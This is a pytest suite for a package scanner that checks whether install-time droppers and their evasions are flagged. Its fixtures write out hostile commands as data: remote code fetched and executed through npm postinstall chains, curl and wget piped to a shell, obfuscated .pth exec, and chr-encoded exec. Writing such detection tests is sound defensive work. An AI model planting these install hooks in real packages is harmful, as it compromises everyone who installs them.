"""White-box evasions of 2026-11-04, install family: install-time code is followed wherever the
install actually goes (npm run chains, interpreter-run files of any suffix, node-gyp actions,
PEP 517 in-tree backends, non-urlretrieve downloads, .pth name dispatch, code-point exec)."""

from __future__ import annotations

from pathlib import Path

import pytest

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory
from skilltotal.loaded_code import install_time_scripts
from skilltotal.scanners.install_scripts import js_runs_fetched_body

_CORPUS = Path(__file__).parent / "eval_corpus"


def _analyze(root: Path):
    return analyze_directory(root, detect_component(root, source=str(root)))


def _flagged(report) -> bool:
    malicious = (report.verdict or {}).get("has_malicious_indicators")
    return bool(malicious) or report.risk_level.value in ("high", "critical")


def _ids(report) -> set[str]:
    return {f.id for f in report.findings}


@pytest.mark.parametrize(
    ("sample", "rule"),
    [
        ("AST02/npm-lifecycle-remote-exec/postinstall-node-https-get-eval",
         "ST-INSTALL-NPM-REMOTE-EXEC"),
        ("AST02/npm-lifecycle-remote-exec/postinstall-npm-run-chain", "ST-INSTALL-NPM-REMOTE-EXEC"),
        ("AST02/npm-lifecycle-remote-exec/postinstall-sh-extensionless-stage",
         "ST-INSTALL-NPM-REMOTE-EXEC"),
        ("AST02/npm-lifecycle-remote-exec/postinstall-node-runs-nonjs-stage",
         "ST-INSTALL-NPM-REMOTE-EXEC"),
        ("AST02/gyp-command-substitution/gyp-action-pipe-shell", "ST-INSTALL-GYP"),
        ("AST02/install-dropper/pep517-in-tree-backend-download-exec",
         "ST-INSTALL-PY-DOWNLOAD-EXEC"),
        ("AST02/install-dropper/setup-py-requests-download-exec", "ST-INSTALL-PY-DOWNLOAD-EXEC"),
        ("AST01/pth-persistence/getattr-dispatch-pth", "ST-PTH-EXEC"),
        ("AST02/install-dropper/setup-py-chr-join-exec", "ST-OBF-DECODE-EXEC"),
    ],
)
def test_evasion_sample_is_flagged(sample: str, rule: str):
    report = _analyze(_CORPUS / "positive" / sample)
    assert rule in _ids(report)
    assert _flagged(report)


@pytest.mark.parametrize(
    ("sample", "rule"),
    [
        ("AST02/npm-lifecycle-remote-exec/postinstall-npm-run-build", "ST-INSTALL-NPM-REMOTE-EXEC"),
        ("AST02/npm-lifecycle-remote-exec/postinstall-fetches-json-manifest",
         "ST-INSTALL-NPM-REMOTE-EXEC"),
        ("AST02/npm-lifecycle-remote-exec/postinstall-sh-extensionless-local-build",
         "ST-INSTALL-NPM-REMOTE-EXEC"),
        ("AST02/gyp-command-substitution/gyp-action-own-build-tool", "ST-INSTALL-GYP"),
        ("AST02/install-dropper/pep517-in-tree-backend-wraps-setuptools",
         "ST-INSTALL-PY-DOWNLOAD-EXEC"),
        ("AST02/install-dropper/setup-py-requests-download-data", "ST-INSTALL-PY-DOWNLOAD-EXEC"),
        ("AST01/pth-persistence/pth-exec-literal-bootstrap", "ST-PTH-EXEC"),
        ("AST02/install-dropper/setup-py-chr-table", "ST-OBF-DECODE-EXEC"),
    ],
)
def test_look_alike_stays_clean(sample: str, rule: str):
    report = _analyze(_CORPUS / "negative" / sample)
    assert rule not in _ids(report)
    assert not _flagged(report)


def test_npm_run_chain_is_followed_transitively_with_pre_and_post_scripts():
    scripts = {
        "postinstall": "npm run a",
        "a": "pnpm run b --silent",
        "preb": "echo pre",
        "b": "\"$npm_execpath\" run-script c",
        "c": "node x.js",
        "unrelated": "curl https://example.invalid | sh",
    }
    names = [name for name, _ in install_time_scripts(scripts, ("preinstall", "postinstall"))]
    assert names == ["postinstall", "a", "preb", "b", "c"]


def test_npm_run_chain_is_bounded():
    scripts = {"postinstall": "npm run s0", **{f"s{i}": f"npm run s{i + 1}" for i in range(50)}}
    assert len(install_time_scripts(scripts, ("postinstall",))) <= 6


def test_chained_script_file_is_read_as_install_code(tmp_path: Path):
    (tmp_path / "package.json").write_text(
        '{"name":"x","version":"1.0.0","scripts":{"postinstall":"npm run setup",'
        '"setup":"node lib/stage.js"}}\n', encoding="utf-8",
    )
    (tmp_path / "lib").mkdir()
    (tmp_path / "lib" / "stage.js").write_text(
        "const cp = require('child_process');\n"
        "require('https').get('https://x.example.invalid/s', (r) => {\n"
        "  let s = ''; r.on('data', (c) => { s += c; }); r.on('end', () => cp.exec(s));\n"
        "});\n", encoding="utf-8",
    )
    assert "ST-INSTALL-NPM-REMOTE-EXEC" in _ids(_analyze(tmp_path))


def test_shell_option_before_extensionless_stage(tmp_path: Path):
    # `bash -e` is errexit, not inline code: the next word is still the file bash runs.
    (tmp_path / "package.json").write_text(
        '{"name":"x","version":"1.0.0","scripts":{"preinstall":"bash -e scripts/stage"}}\n',
        encoding="utf-8",
    )
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "stage").write_text(
        "wget -qO- https://x.example.invalid/s | bash\n", encoding="utf-8",
    )
    assert "ST-INSTALL-NPM-REMOTE-EXEC" in _ids(_analyze(tmp_path))


def test_fetched_body_must_reach_the_sink():
    fetch_eval = "fetch(u).then((r) => r.text()).then((code) => eval(code))"
    assert js_runs_fetched_body(fetch_eval) is not None
    fetch_parse = "fetch(u).then((r) => r.text()).then((t) => JSON.parse(t))"
    assert js_runs_fetched_body(fetch_parse) is None
    # A regex `.exec` on the body is a match, not a command.
    regex = "https.get(u, (r) => { let b = ''; r.on('data', (c) => b += c); /v=(\\d+)/.exec(b); })"
    assert js_runs_fetched_body(regex) is None
    # Without a request, a stream collected and evaluated is not fetched code.
    local = "fs.createReadStream(p).on('data', (c) => b += c); eval(b)"
    assert js_runs_fetched_body(local) is None


def test_pth_name_dispatch_and_non_literal_exec(tmp_path: Path):
    for name, line in [
        ("a.pth", "import os; vars(os)['sys' + 'tem']('id')\n"),
        ("b.pth", "import os; os.__getattribute__('system')('id')\n"),
        ("c.pth", "import os; exec(os.environ.get('X', ''))\n"),
    ]:
        root = tmp_path / name
        root.mkdir()
        (root / name).write_text(line, encoding="utf-8")
        assert "ST-PTH-EXEC" in _ids(_analyze(root)), name


def test_codepoint_exec_direct_form(tmp_path: Path):
    (tmp_path / "setup.py").write_text(
        "exec(''.join(map(chr, [112, 114, 105, 110, 116, 40, 41])))\n", encoding="utf-8",
    )
    assert "ST-OBF-DECODE-EXEC" in _ids(_analyze(tmp_path))
